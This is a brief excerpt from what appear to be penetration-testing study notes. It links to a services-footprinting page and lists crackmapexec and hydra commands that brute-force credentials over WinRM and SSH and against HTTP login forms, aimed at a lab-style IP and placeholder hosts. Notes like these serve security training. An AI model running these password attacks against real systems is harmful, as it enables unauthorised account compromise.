
- check [services footprinting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Footprinting/Services.md)

```bash
crackmapexec winrm 10.129.42.197 -u user.list -p password.list

hydra -L user.list -P password.list ssh://10.129.42.197

hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form  "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
```
